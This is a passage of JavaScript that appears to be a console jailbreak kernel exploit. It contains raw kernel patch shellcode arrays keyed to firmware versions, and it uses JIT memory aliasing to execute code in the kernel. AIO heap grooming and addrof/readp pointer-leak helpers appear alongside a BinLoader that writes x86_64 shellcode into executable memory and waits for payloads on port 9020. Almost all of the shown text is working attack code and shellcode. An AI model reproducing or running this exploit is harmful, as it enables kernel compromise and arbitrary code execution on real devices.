    0x00, 0xC7, 0x81, 0xCE, 0x5A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0x20, 0x66,
    0x44, 0x89, 0x91, 0xD2, 0x5A, 0x41, 0x00, 0xC6, 0x81, 0xD4, 0x5A, 0x41,
    0x00, 0x00, 0x66, 0x44, 0x89, 0x99, 0xDF, 0x5A, 0x41, 0x00, 0xC6, 0x81,
    0xE1, 0x5A, 0x41, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00,
    0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x47,
    0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29, 0xC6, 0x48,
    0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F, 0x11, 0x02,
    0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B, 0x47, 0x18,
    0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x20, 0x48,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28, 0x48, 0x8B,
    0x10, 0x48, 0x89, 0x91, 0x00, 0x7F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x08,
    0x48, 0x89, 0x91, 0x08, 0x7F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x10, 0x48,
    0x89, 0x91, 0x10, 0x7F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x89,
    0x91, 0x18, 0x7F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48, 0x89, 0x91,
    0x20, 0x7F, 0x10, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x81, 0x28,
    0x7F, 0x10, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x29,
    0xC2, 0x0F, 0x1F, 0x00, 0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48,
    0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x86
  ]);
  const kpatch903_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xBA, 0xEB, 0x04, 0x00, 0x00, 0x41, 0xBB, 0x90, 0xE9, 0xFF, 0xFF,
    0x48, 0x81, 0xC2, 0x9B, 0x30, 0x05, 0x00, 0x66, 0x89, 0x81, 0x34, 0x48,
    0x62, 0x00, 0xC6, 0x81, 0xCD, 0x0A, 0x00, 0x00, 0xEB, 0xC6, 0x81, 0x7D,
    0x10, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0xC1, 0x10, 0x27, 0x00, 0xEB, 0xC6,
    0x81, 0x3D, 0x11, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0x81, 0x11, 0x27, 0x00,
    0xEB, 0xC6, 0x81, 0x2D, 0x13, 0x27, 0x00, 0xEB, 0xC6, 0x81, 0xDD, 0x17,
    0x27, 0x00, 0xEB, 0xC6, 0x81, 0xAD, 0x18, 0x27, 0x00, 0xEB, 0x66, 0x89,
    0xB1, 0x1F, 0x51, 0x62, 0x00, 0xC7, 0x81, 0x90, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x81, 0xC2, 0x04, 0x00, 0x00, 0xEB, 0x66, 0x44,
    0x89, 0x81, 0xB9, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xB5, 0x04,
    0x00, 0x00, 0xC6, 0x81, 0x06, 0x1A, 0x00, 0x00, 0xEB, 0x66, 0x44, 0x89,
    0x91, 0x8B, 0x0B, 0x08, 0x00, 0x66, 0x44, 0x89, 0x99, 0x94, 0xAB, 0x23,
    0x00, 0xC6, 0x81, 0x4F, 0xB3, 0x23, 0x00, 0xEB, 0xC7, 0x81, 0x10, 0x18,
    0x22, 0x00, 0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0xDA, 0x62, 0x16, 0x00,
    0x37, 0xC6, 0x81, 0xDD, 0x62, 0x16, 0x00, 0x37, 0xC7, 0x81, 0x20, 0xC5,
    0x0F, 0x01, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0x28, 0xC5, 0x0F,
    0x01, 0xC7, 0x81, 0x4C, 0xC5, 0x0F, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F,
    0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8,
    0xEB, 0x48, 0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x31, 0xF6, 0x45,
    0x31, 0xC0, 0x66, 0x89, 0x81, 0x71, 0x39, 0x41, 0x00, 0xB8, 0xEB, 0x06,
    0x00, 0x00, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x01, 0x00,
    0x00, 0x00, 0x66, 0x89, 0x81, 0xB3, 0x39, 0x41, 0x00, 0x41, 0xBB, 0x49,
    0x8B, 0xFF, 0xFF, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x81, 0xBB, 0x39, 0x41, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0xCD, 0x39, 0x41, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0xDA, 0x39, 0x41, 0x00, 0xB8, 0x05, 0x00, 0x00,
    0x00, 0xC7, 0x81, 0xC9, 0x39, 0x41, 0x00, 0x49, 0x8B, 0x87, 0xD0, 0xC6,
    0x81, 0xCF, 0x39, 0x41, 0x00, 0x00, 0xC7, 0x81, 0xD6, 0x39, 0x41, 0x00,
    0x49, 0x8B, 0xB7, 0xB0, 0xC6, 0x81, 0xDC, 0x39, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0xEE, 0x39, 0x41, 0x00, 0x49, 0x8B, 0x87, 0x40, 0x66, 0x89, 0x81,
    0xF2, 0x39, 0x41, 0x00, 0xC6, 0x81, 0xF4, 0x39, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0xFB, 0x39, 0x41, 0x00, 0x49, 0x8B, 0xB7, 0x20, 0x66, 0x89, 0x91,
    0xFF, 0x39, 0x41, 0x00, 0xC6, 0x81, 0x01, 0x3A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0x13, 0x3A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0xC0, 0x66, 0x89, 0xB1,
    0x17, 0x3A, 0x41, 0x00, 0xC6, 0x81, 0x19, 0x3A, 0x41, 0x00, 0x00, 0xC7,
    0x81, 0x1F, 0x3A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0xE0, 0x66, 0x44, 0x89,
    0x81, 0x23, 0x3A, 0x41, 0x00, 0xC6, 0x81, 0x25, 0x3A, 0x41, 0x00, 0x00,
    0xC7, 0x81, 0x32, 0x3A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0x00, 0x66, 0x44,
    0x89, 0x89, 0x36, 0x3A, 0x41, 0x00, 0xC6, 0x81, 0x38, 0x3A, 0x41, 0x00,
    0x00, 0xC7, 0x81, 0x3E, 0x3A, 0x41, 0x00, 0x49, 0x8D, 0xBF, 0x20, 0x66,
    0x44, 0x89, 0x91, 0x42, 0x3A, 0x41, 0x00, 0xC6, 0x81, 0x44, 0x3A, 0x41,
    0x00, 0x00, 0x66, 0x44, 0x89, 0x99, 0x4F, 0x3A, 0x41, 0x00, 0xC6, 0x81,
    0x51, 0x3A, 0x41, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00,
    0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x47,
    0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29, 0xC6, 0x48,
    0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F, 0x11, 0x02,
    0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B, 0x47, 0x18,
    0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x20, 0x48,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28, 0x48, 0x8B,
    0x10, 0x48, 0x89, 0x91, 0x00, 0x3F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x08,
    0x48, 0x89, 0x91, 0x08, 0x3F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x10, 0x48,
    0x89, 0x91, 0x10, 0x3F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x89,
    0x91, 0x18, 0x3F, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48, 0x89, 0x91,
    0x20, 0x3F, 0x10, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x81, 0x28,
    0x3F, 0x10, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x29,
    0xC2, 0x0F, 0x1F, 0x00, 0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48,
    0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x86
  ]);
  const kpatch950_bin = new Uint8Array([
    0xB9, 0x82, 0x00, 0x00, 0xC0, 0x48, 0x89, 0xF7, 0x0F, 0x32, 0x48, 0xC1,
    0xE2, 0x20, 0x89, 0xC0, 0x48, 0x09, 0xC2, 0x48, 0x8D, 0x8A, 0x40, 0xFE,
    0xFF, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F,
    0x22, 0xC0, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0xBE, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xB8, 0xEB, 0x00, 0x00, 0x00, 0x41, 0xB9, 0xEB, 0x00, 0x00, 0x00,
    0x41, 0xBA, 0xEB, 0x04, 0x00, 0x00, 0x41, 0xBB, 0x90, 0xE9, 0xFF, 0xFF,
    0x48, 0x81, 0xC2, 0xAD, 0x58, 0x01, 0x00, 0x66, 0x89, 0x81, 0xE4, 0x4A,
    0x62, 0x00, 0xC6, 0x81, 0xCD, 0x0A, 0x00, 0x00, 0xEB, 0xC6, 0x81, 0x0D,
    0x1C, 0x20, 0x00, 0xEB, 0xC6, 0x81, 0x51, 0x1C, 0x20, 0x00, 0xEB, 0xC6,
    0x81, 0xCD, 0x1C, 0x20, 0x00, 0xEB, 0xC6, 0x81, 0x11, 0x1D, 0x20, 0x00,
    0xEB, 0xC6, 0x81, 0xBD, 0x1E, 0x20, 0x00, 0xEB, 0xC6, 0x81, 0x6D, 0x23,
    0x20, 0x00, 0xEB, 0xC6, 0x81, 0x3D, 0x24, 0x20, 0x00, 0xEB, 0x66, 0x89,
    0xB1, 0xCF, 0x53, 0x62, 0x00, 0xC7, 0x81, 0x90, 0x04, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xC6, 0x81, 0xC2, 0x04, 0x00, 0x00, 0xEB, 0x66, 0x44,
    0x89, 0x81, 0xB9, 0x04, 0x00, 0x00, 0x66, 0x44, 0x89, 0x89, 0xB5, 0x04,
    0x00, 0x00, 0xC6, 0x81, 0x36, 0xA5, 0x1F, 0x00, 0xEB, 0x66, 0x44, 0x89,
    0x91, 0x3B, 0x6D, 0x19, 0x00, 0x66, 0x44, 0x89, 0x99, 0x24, 0xF7, 0x19,
    0x00, 0xC6, 0x81, 0xDF, 0xFE, 0x19, 0x00, 0xEB, 0xC7, 0x81, 0x60, 0x19,
    0x01, 0x00, 0x48, 0x31, 0xC0, 0xC3, 0xC6, 0x81, 0x7A, 0x2D, 0x12, 0x00,
    0x37, 0xC6, 0x81, 0x7D, 0x2D, 0x12, 0x00, 0x37, 0xC7, 0x81, 0x00, 0x95,
    0x0F, 0x01, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0x91, 0x08, 0x95, 0x0F,
    0x01, 0xC7, 0x81, 0x2C, 0x95, 0x0F, 0x01, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x22, 0xC0, 0x0F,
    0x20, 0xC0, 0x48, 0x25, 0xFF, 0xFF, 0xFE, 0xFF, 0x0F, 0x22, 0xC0, 0xB8,
    0xEB, 0x48, 0x00, 0x00, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x31, 0xF6, 0x45,
    0x31, 0xC0, 0x66, 0x89, 0x81, 0x71, 0x77, 0x0D, 0x00, 0xB8, 0xEB, 0x06,
    0x00, 0x00, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x01, 0x00,
    0x00, 0x00, 0x66, 0x89, 0x81, 0xB3, 0x77, 0x0D, 0x00, 0x41, 0xBB, 0x49,
    0x8B, 0xFF, 0xFF, 0x48, 0xB8, 0x41, 0x83, 0xBF, 0xA0, 0x04, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x81, 0xBB, 0x77, 0x0D, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0xCD, 0x77, 0x0D, 0x00, 0xB8, 0x04, 0x00, 0x00,
    0x00, 0x66, 0x89, 0x81, 0xDA, 0x77, 0x0D, 0x00, 0xB8, 0x05, 0x00, 0x00,
    0x00, 0xC7, 0x81, 0xC9, 0x77, 0x0D, 0x00, 0x49, 0x8B, 0x87, 0xD0, 0xC6,
    0x81, 0xCF, 0x77, 0x0D, 0x00, 0x00, 0xC7, 0x81, 0xD6, 0x77, 0x0D, 0x00,
    0x49, 0x8B, 0xB7, 0xB0, 0xC6, 0x81, 0xDC, 0x77, 0x0D, 0x00, 0x00, 0xC7,
    0x81, 0xEE, 0x77, 0x0D, 0x00, 0x49, 0x8B, 0x87, 0x40, 0x66, 0x89, 0x81,
    0xF2, 0x77, 0x0D, 0x00, 0xC6, 0x81, 0xF4, 0x77, 0x0D, 0x00, 0x00, 0xC7,
    0x81, 0xFB, 0x77, 0x0D, 0x00, 0x49, 0x8B, 0xB7, 0x20, 0x66, 0x89, 0x91,
    0xFF, 0x77, 0x0D, 0x00, 0xC6, 0x81, 0x01, 0x78, 0x0D, 0x00, 0x00, 0xC7,
    0x81, 0x13, 0x78, 0x0D, 0x00, 0x49, 0x8D, 0xBF, 0xC0, 0x66, 0x89, 0xB1,
    0x17, 0x78, 0x0D, 0x00, 0xC6, 0x81, 0x19, 0x78, 0x0D, 0x00, 0x00, 0xC7,
    0x81, 0x1F, 0x78, 0x0D, 0x00, 0x49, 0x8D, 0xBF, 0xE0, 0x66, 0x44, 0x89,
    0x81, 0x23, 0x78, 0x0D, 0x00, 0xC6, 0x81, 0x25, 0x78, 0x0D, 0x00, 0x00,
    0xC7, 0x81, 0x32, 0x78, 0x0D, 0x00, 0x49, 0x8D, 0xBF, 0x00, 0x66, 0x44,
    0x89, 0x89, 0x36, 0x78, 0x0D, 0x00, 0xC6, 0x81, 0x38, 0x78, 0x0D, 0x00,
    0x00, 0xC7, 0x81, 0x3E, 0x78, 0x0D, 0x00, 0x49, 0x8D, 0xBF, 0x20, 0x66,
    0x44, 0x89, 0x91, 0x42, 0x78, 0x0D, 0x00, 0xC6, 0x81, 0x44, 0x78, 0x0D,
    0x00, 0x00, 0x66, 0x44, 0x89, 0x99, 0x4F, 0x78, 0x0D, 0x00, 0xC6, 0x81,
    0x51, 0x78, 0x0D, 0x00, 0xFF, 0x0F, 0x20, 0xC0, 0x48, 0x0D, 0x00, 0x00,
    0x01, 0x00, 0x0F, 0x22, 0xC0, 0x48, 0x8B, 0x57, 0x08, 0x48, 0x8B, 0x47,
    0x10, 0x48, 0x89, 0xD6, 0x4C, 0x8D, 0x40, 0x01, 0x4C, 0x29, 0xC6, 0x48,
    0x83, 0xFE, 0x0E, 0x76, 0x6D, 0xF3, 0x0F, 0x6F, 0x00, 0x0F, 0x11, 0x02,
    0x48, 0x8B, 0x40, 0x10, 0x48, 0x89, 0x42, 0x10, 0x48, 0x8B, 0x47, 0x18,
    0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x20, 0x48,
    0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x28, 0x48, 0x8B,
    0x10, 0x48, 0x89, 0x91, 0xE0, 0x0E, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x08,
    0x48, 0x89, 0x91, 0xE8, 0x0E, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x10, 0x48,
    0x89, 0x91, 0xF0, 0x0E, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x89,
    0x91, 0xF8, 0x0E, 0x10, 0x01, 0x48, 0x8B, 0x50, 0x20, 0x48, 0x89, 0x91,
    0x00, 0x0F, 0x10, 0x01, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x81, 0x08,
    0x0F, 0x10, 0x01, 0x31, 0xC0, 0xC3, 0x4C, 0x8D, 0x40, 0x18, 0x48, 0x29,
    0xC2, 0x0F, 0x1F, 0x00, 0x0F, 0xB6, 0x30, 0x40, 0x88, 0x34, 0x02, 0x48,
    0x83, 0xC0, 0x01, 0x49, 0x39, 0xC0, 0x75, 0xF0, 0xEB, 0x86
  ]);
//  const buf = await get_patches(patch_elf_loc);
  var buf;
  switch (Console_FW_Version) {
    case "7.00":
    case "7.01":
    case "7.02":
      buf = kpatch700_bin.buffer;
      break;
    case "7.50":
    case "7.51":
    case "7.55":
      buf = kpatch750_bin.buffer;
      break;
    case "8.00":
    case "8.01":
    case "8.03":
      buf = kpatch800_bin.buffer;
      break;
    case "8.50":
    case "8.52":
      buf = kpatch850_bin.buffer;
      break;
    case "9.00":
      buf = kpatch900_bin.buffer;
      break;
    case "9.03":
    case "9.04":
      buf = kpatch903_bin.buffer;
      break;
    case "9.50":
    case "9.51":
    case "9.60":
      buf = kpatch950_bin.buffer;
      break;
    default:
      die('kpatch_bin file not found');
      break;
  }
  // FIXME handle .bss segment properly
  // assume start of loadable segments is at offset 0x1000
  const patches = new View1(buf);
  let map_size = patches.size;
  const max_size = 0x10000000;
  if (map_size > max_size) {
    die(`patch file too large (>${max_size}): ${map_size}`);
  }
  if (map_size === 0) {
    die('patch file size is zero');
  }
  //log(`kpatch size: ${map_size} bytes`);
  map_size = (map_size + page_size) & -page_size;
  const prot_rwx = 7;
  const prot_rx = 5;
  const prot_rw = 3;
  const exec_p = new Int(0, 9);
  const write_p = new Int(max_size, 9);
  //log('open JIT fds');
  const exec_fd = sysi('jitshm_create', 0, map_size, prot_rwx);
  const write_fd = sysi('jitshm_alias', exec_fd, prot_rw);
  //log('mmap for kpatch shellcode');
  const exec_addr = chain.sysp(
    'mmap',
    exec_p,
    map_size,
    prot_rx,
    MAP_SHARED | MAP_FIXED,
    exec_fd,
    0
  );
  const write_addr = chain.sysp(
    'mmap',
    write_p,
    map_size,
    prot_rw,
    MAP_SHARED | MAP_FIXED,
    write_fd,
    0
  );
  //log(`exec_addr: ${exec_addr}`);
  //log(`write_addr: ${write_addr}`);
  if (exec_addr.ne(exec_p) || write_addr.ne(write_p)) {
    die('mmap() for jit failed');
  }
  //log('mlock exec_addr for kernel exec');
  sysi('mlock', exec_addr, map_size);
  // mov eax, 0x1337; ret (0xc300_0013_37b8)
  const test_code = new Int(0x001337b8, 0xc300);
  write_addr.write64(0, test_code);
  //log('test jit exec');
  sys_void('kexec', exec_addr);
  let retval = chain.errno;
  //log('returned successfully');
  //log(`jit retval: ${retval}`);
  if (retval !== 0x1337) {
    die('test jit exec failed');
  }
  const pipe_save = restore_info[1];
  restore_info[1] = pipe_save.addr;
  //log('mlock pipe save data for kernel restore');
  sysi('mlock', restore_info[1], page_size);
  // Restore tweaks from Al-Azif's source
  restore_info[4] = sysent_661_save.addr;
  //log('mlock sysent_661 save data for kernel restore');
  sysi('mlock', restore_info[4], page_size);
  //log('execute kpatch...');
  mem.cpy(write_addr, patches.addr, patches.size);
  sys_void('kexec', exec_addr, ...restore_info);
  //log('setuid(0)');
  //sysi('setuid', 0);
  //log('kernel exploit succeeded!');
  //log('restore sys_aio_submit()');
  //kmem.write32(sysent_661, sy_narg);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  //kmem.write64(sysent_661.add(8), sy_call);
  // .sy_thrcnt = SY_THR_STATIC
  //kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
}
//================================================================================================
// STAGE SETUP ===================================================================================
//================================================================================================
function setup(block_fd) {
  // this part will block the worker threads from processing entries so that
  // we may cancel them instead. this is to work around the fact that
  // aio_worker_entry2() will fdrop() the file associated with the aio_entry
  // on ps5. we want aio_multi_delete() to call fdrop()
  //log('block AIO');
  const reqs1 = new Buffer(0x28 * num_workers);
  const block_id = new Word();
  for (let i = 0; i < num_workers; i++) {
    reqs1.write32(8 + i * 0x28, 1);
    reqs1.write32(0x20 + i * 0x28, block_fd);
  }
  aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
  //log('heap grooming');
  // chosen to maximize the number of 0x80 malloc allocs per submission
  const num_reqs = 3;
  const groom_ids = new View4(num_grooms);
  const groom_ids_p = groom_ids.addr;
  const greqs = make_reqs1(num_reqs);
  // allocate enough so that we start allocating from a newly created slab
  spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
  cancel_aios(groom_ids_p, num_grooms);
  //log('Setup complete');
  return [block_id, groom_ids];
}
//================================================================================================
// Bin Loader ====================================================================================
//================================================================================================
function runBinLoader() {
  // 1. Allocate a large (0x300000 bytes) memory buffer for the *main* payload.
  //    It is marked as Readable, Writable, and Executable (RWX).
  //    This buffer will likely be passed AS AN ARGUMENT to the loader.
  var payload_buffer = chain.sysp('mmap', 0, 0x300000, (PROT_READ | PROT_WRITE | PROT_EXEC), MAP_ANON, -1, 0);
  // 2. Allocate a smaller (0x1000 bytes) buffer for the
  //    *loader shellcode itself* using the custom malloc32 helper.
  var payload_loader = malloc32(0x1000);
  // 3. Get the JS-accessible backing array for the loader buffer.
  var BLDR = payload_loader.backing;
  // 4. --- START OF SHELLCODE ---
  //    This is not JavaScript. This is raw x86_64 machine code, written
  //    as 32-bit integers (hex values), directly into the executable buffer.
  //    This code is the "BinLoader" itself.
  BLDR[0]  = 0x56415741; BLDR[1]  = 0x83485541; BLDR[2]  = 0x894818EC;
  BLDR[3]  = 0xC748243C; BLDR[4]  = 0x10082444; BLDR[5]  = 0x483C2302;
  BLDR[6]  = 0x102444C7; BLDR[7]  = 0x00000000; BLDR[8]  = 0x000002BF;
  BLDR[9]  = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
  BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
  BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
  BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
  BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
  BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
  BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
  BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
  BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
  BLDR[36] = 0x00001EE8; BLDR[37] = 0x2414FF00; BLDR[38] = 0x18C48348;
  BLDR[39] = 0x5E415D41; BLDR[40] = 0x31485F41; BLDR[41] = 0xC748C3C0;
  BLDR[42] = 0x000003C0; BLDR[43] = 0xCA894900; BLDR[44] = 0x48C3050F;
  BLDR[45] = 0x0006C0C7; BLDR[46] = 0x89490000; BLDR[47] = 0xC3050FCA;
  BLDR[48] = 0x1EC0C748; BLDR[49] = 0x49000000; BLDR[50] = 0x050FCA89;
  BLDR[51] = 0xC0C748C3; BLDR[52] = 0x00000061; BLDR[53] = 0x0FCA8949;
  BLDR[54] = 0xC748C305; BLDR[55] = 0x000068C0; BLDR[56] = 0xCA894900;
  BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
  BLDR[60] = 0xC3050FCA;
  // --- END OF SHELLCODE ---
  // 5. Use the 'mprotect' system call to *explicitly* mark the
  //    'payload_loader' buffer as RWX (Readable, Writable, Executable).
  //    This is a "belt and suspenders" call to ensure the OS will
  //    allow the CPU to execute the shellcode we just wrote.
  chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
  // 6. Allocate memory for a pthread (thread) structure.
  var pthread = malloc(0x10);
  // 7. Lock the main payload buffer in memory to prevent it from
  //    being paged out to disk.
  sysi('mlock', payload_buffer, 0x300000);
  //    Create a new native thread.
  call_nze(
    'pthread_create',
    pthread, // Pointer to the thread structure
    0, // Thread attributes (default)
    payload_loader, // The START ROUTINE (entry point). This is the address of our shellcode.
    payload_buffer // The ARGUMENT to pass to the shellcode.
  );
  log('BinLoader is ready. Send a payload to port 9020 now');
}
//================================================================================================
// Malloc ========================================================================================
//================================================================================================
// This function is a C-style 'malloc' (memory allocate) implementation
// for this low-level exploit environment.
// It allocates a raw memory buffer of 'sz' BYTES and returns a
// raw pointer to it, bypassing normal JavaScript memory management.
function malloc(sz) {
  // 1. Allocate a standard JavaScript Uint8Array.
  //    The total size is 'sz' bytes (the requested size) plus a
  //    0x10000 byte offset (which might be for metadata or alignment).
  var backing = new Uint8Array(0x10000 + sz);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is critical to prevent the JS engine from freeing this
  //    memory block. If it were freed, 'ptr' would become a "dangling pointer"
  //    and lead to a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic to "steal" the raw pointer from the JS object.
  //    - mem.addrof(backing): Gets the address of the JS 'backing' object.
  //    - .add(0x10): Moves to the internal offset (16 bytes) where the
  //      pointer to the raw data buffer is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. Attach the original JS 'backing' array itself as a property
  //    to the 'ptr' object.
  //    This is a convenience, bundling the raw pointer ('ptr') with a
  //    "safe" JS-based way ('ptr.backing') to access the same memory.
  ptr.backing = backing;
  // 5. Return the 'ptr' object, which now acts as a raw pointer
  //    to the newly allocated block of 'sz' bytes.
  return ptr;
}
//================================================================================================
// Malloc for 32-bit =============================================================================
//================================================================================================
// This function mimics the C-standard 'malloc' function but for a 32-bit
// aligned buffer. It allocates memory using a standard JS ArrayBuffer
// but returns a *raw pointer* to its internal data buffer.
function malloc32(sz) {
  // 1. Allocate a standard JavaScript byte array.
  //    'sz * 4' suggests 'sz' is the number of 32-bit (4-byte) elements.
  //    The large base size (0x10000) might be to ensure a specific 
  //    allocation type or to hold internal metadata for this "fake malloc".
  var backing = new Uint8Array(0x10000 + sz * 4);
  // 2. Add this array to the 'no garbage collection' (nogc) list.
  //    This is CRITICAL. It prevents the JS engine from freeing this
  //    memory block. If the 'backing' array was collected, 'ptr' would
  //    become a "dangling pointer" and cause a 'use-after-free' crash.
  nogc.push(backing);
  // 3. This is the core logic for getting the raw address.
  //    - mem.addrof(backing): Gets the memory address of the JS 'backing' object.
  //    - .add(0x10): Moves to the offset (16 bytes) where the internal
  //      data pointer (pointing to the raw buffer) is stored.
  //    - mem.readp(...): Reads the 64-bit pointer at that offset.
  //
  //    'ptr' now holds the *raw memory address* of the array's actual data.
  var ptr = mem.readp(mem.addrof(backing).add(0x10));
  // 4. This is a convenience. It attaches a 32-bit view of the *original*
  //    JS buffer (backing.buffer) as a property to the 'ptr' object.
  //    This bundles the raw pointer ('ptr') with a "safe" JS-based way
  //    to access the same memory ('ptr.backing').
  ptr.backing = new Uint32Array(backing.buffer);
  // 5. Return the 'ptr' object. This object now represents a raw
  //    pointer to the newly allocated and GC-protected memory.
  return ptr;
}
//================================================================================================
// Create 32-bit Array from Address ==============================================================
//================================================================================================
// This function creates a "fake" Uint32Array that is backed by an
// arbitrary memory address 'addr' instead of its own data buffer.
function array_from_address(addr, size) {
  // 1. Create a normal, "original" (og) Uint32Array.
  //    Its actual contents don't matter.
